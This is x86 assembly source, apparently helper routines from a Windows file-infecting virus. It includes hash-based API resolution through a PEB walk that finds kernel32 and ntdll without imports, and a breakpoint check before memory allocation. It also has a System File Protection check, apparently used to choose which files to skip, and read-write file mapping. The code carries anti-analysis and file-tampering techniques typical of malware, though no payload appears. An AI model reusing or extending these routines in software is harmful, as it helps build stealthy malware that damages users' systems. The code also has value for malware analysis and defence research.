;---------------------------------------------------------------------------;
;                           AllocateMemory                  ;
;---------------------------------------------------------------------------;
; call diretly ntdll.NtAllocateVirtualMemory

; __in  : eax = alloc size
; __out : eax = ptr allocated mem 
AllocateMem:        push ebx
            push ecx
            push edx

            push eax
            mov ebx,esp

            push 0
            mov ecx,esp

            push 0E0762FEBh ; NtAllocateVirtualMemory   
            call get_ntdll
            push eax
            call GetProcAddressCrc
            test eax,eax
            jz @ll
    
            push eax
            mov edx,eax
            call detect_bpx
            test eax,eax
            pop eax
            jnz @ll
    
            push ebx
            push PAGE_READWRITE
            push MEM_COMMIT OR MEM_RESERVE
            push ebx
            push 0
            push ecx
            push -1
            call eax
            pop ebx
            test eax,eax
            jnz @l2
    
            mov eax,dword ptr [ebx - 4]
            jmp @ll 
    
@l2:            xor eax,eax

@ll:            add esp,8
            pop edx
            pop ecx
            pop ebx
            retn
;---------------------------------------------------------------------------;
;                              FreeMemory                   ;
;---------------------------------------------------------------------------;
; call ntdll.NtFreeVirtualMemory

; eax = ptr buffer
; ecx = alloc size
FreeMem:        push ebx
            mov ebx,eax     

            push 0E9D6CE5Eh ; NtFreeVirtualMemory   
            call get_ntdll
            push eax
            call GetProcAddressCrc
            test eax,eax
            jz @f
                
            push -1 
            push ebx
            push ecx
            push MEM_RELEASE
            call eax
@@:         pop ebx
            retn
    
;---------------------------------------------------------------------------;
;                strlen                                     ;                   
;---------------------------------------------------------------------------;
;in  : esi = ptr string
;out : eax = len
strlen:         push esi
            xor eax,eax     

strlen_loop:        cmp byte ptr [esi],0
            je strlen_end
            inc eax
            inc esi
            jmp strlen_loop

strlen_end:     pop esi 
            ret
;---------------------------------------------------------------------------;
;                                 CRC32                                     ;   
;---------------------------------------------------------------------------;
; coded by berniee
; in  : esi = ptr string
; in  : eax = len of string
; out : eax = crc32
crc32:          push esi
            push ebx
            push ecx
            push edx
        
            mov ecx,eax
            xor edx,edx
                dec edx
                @0: lodsb
                xor dl,al 
                push ecx 
                push 8 
                pop ecx ;silmaril note ;) 
                @1: shr edx,1 
                jnc @f 
                xor edx,0EDB88320h 
                @@: loop @1 
                pop ecx 
                loop @0 
                not edx 
                xchg edx,eax
        
               pop edx
                pop ecx
                pop ebx
                pop esi 
                ret
;--------------------------------------------------------------------------;
;                               GetKernel                  ; 
;--------------------------------------------------------------------------;
; get kernel32 (PEB)
            assume fs:nothing
get_kernel:     jmp get_kernel2

;search the InMemoryOrder module list for the kernel32 module using a hash of the module name for comparison.
;We also normalise the module name to uppercase as some systems store module names in uppercase and some in lowercase.
;http://www.harmonysecurity.com/blog/2009/06/retrieving-kernel32s-base-address.html

; such a complicated routine is needed for windows7 where there are two kernels (kernelBA,kernel32) in address space 
; we need to obtain kernel32 as the kernelBA is missing some of needed APIS                 
get_kernel2:        pushad 
            cld                     ; clear the direction flag for the loop
            xor edx, edx            ; zero edx

            mov edx, fs:[edx+30h]       ; get a pointer to the PEB
            mov edx, [edx+0Ch]          ; get PEB->Ldr
            mov edx, [edx+14h]          ; get the first module from the InMemoryOrder module list

next_mod:       mov esi, [edx+28h]          ; get pointer to modules name (unicode string)
            mov ecx, 24                 ; set ecx to length for the loop
            xor edi, edi                ; clear edi which will store the hash of the module name

loop_modname:       xor eax, eax            ; clear eax
            lodsb               ; read in the next byte of the name
            cmp al, 'a'             ; some versions of Windows use lower case module names
            jl not_lowercase
            sub al, 20h             ; if so normalise to uppercase

not_lowercase:      ror edi, 13             ; rotate right our hash value
            add edi, eax            ; add the next byte of the name to the hash
            loop loop_modname       ; loop until we have read enough

            cmp edi, 6A4ABC5Bh          ; compare the hash with that of KERNEL32.DLL
            mov ebx, [edx+10h]          ; get this modules base address
            mov edx, [edx]              ; get the next module
            jne next_mod                ; if it doesn't match, process the next module
                
            mov dword ptr[esp + 1ch],ebx    ;save kernel base to eax
            popad
            retn   

;--------------------------------------------------------------------------;
;                               GetNtdll                                   ;
;--------------------------------------------------------------------------;
            assume fs:nothing
get_ntdll:      xor eax,eax
            add eax,30h
            mov eax, dword ptr fs:[eax]
            mov eax, dword ptr [eax+0Ch]
            mov eax, dword ptr [eax+01Ch]
            mov eax, dword ptr [eax+8]
            ret 
;---------------------------------------------------------------------------;
;                          is SFC protected                 ;
;---------------------------------------------------------------------------;
; in  : eax = ptr file name
; out : if 0 < ret => is protected 
            assume ebp: ptr vars
IsSfcProtected:     mov ebx,eax
            sub esp,MAX_PATH * 2
            mov ecx,esp

            push ecx        
            push ecx
            push MAX_PATH  
            call dword ptr [ebp].aGetCurrentDirectory ; GetCurrentDirectory
            pop ecx
            mov edi,MAX_PATH
            sub edi,eax
            mov edx,2
            mul edx
            push ecx
            add ecx,eax
            mov byte ptr[ecx],'\'
            add ecx,2

            push edi
            push ecx
            push -1
            push ebx
            push 0
            push 0
            call dword ptr [ebp].aMultiByteToWideChar ; MultiByteToWideChar

            push 0
            call dword ptr [ebp].aSfcIsFileProtected ; SfcIsFileProtected
            add esp,MAX_PATH * 2
            ret
;---------------------------------------------------------------------------;
;                             map file                  ;
;---------------------------------------------------------------------------;
; __in  : eax = filename
; __in  : ecx = map_size 
; __out : eax = mapped image
;         eax = 0 -> error occured  
MapFile:        push ecx ; MapViewofFile -> map_size
            push 0
            push FILE_ATTRIBUTE_NORMAL
            push OPEN_EXISTING 
            push 0
            push FILE_SHARE_READ
            push GENERIC_WRITE OR GENERIC_READ
            push eax
            call dword ptr [ebp].aCreateFile ; CreateFile
            mov dword ptr [ebp].hFile,eax ; hFile
            cmp eax,-1
            je MapBadEnd2
        
            ; map file to memory
            xor ebx,ebx
            push ebx
            push [esp + 4]
            push ebx
            push PAGE_READWRITE
            push ebx
            push eax
            call dword ptr [ebp].aCreateFileMapping ; CreateFileMapping
            test eax,eax
            jz MapBadEnd
            mov dword ptr [ebp].hFileMap,eax ; hFileMap
    
            xor ebx,ebx
            push ebx
            push ebx
            push FILE_MAP_ALL_ACCESS
            push eax
            call dword ptr [ebp].aMapViewOfFile ; MapViewOfFile
            sub esp,4 ;
            test eax,eax
            jz MapBadEnd
            mov dword ptr [ebp].ptrMappedImage,eax
            add esp,4
            retn
MapBadEnd:      call UnmapFile
MapBadEnd2:     add esp,4
            xor eax,eax 
            retn    
;---------------------------------------------------------------------------;
;                            unmap file                     ;
;---------------------------------------------------------------------------;
UnmapFile:      pushad 
            push dword ptr [ebp].ptrMappedImage ; ptrMappedImage 
            call dword ptr [ebp].aUnmapViewOfFile ; UnmapViewOfFileEx
            
            push dword ptr [ebp].hFileMap ; hFileMap
            call dword ptr [ebp].aCloseHandle  ; CloseHandle
        
            push dword ptr [ebp].hFile ; hFile 
            call dword ptr [ebp].aCloseHandle  ; CloseHandle
                
            popad 
            retn                
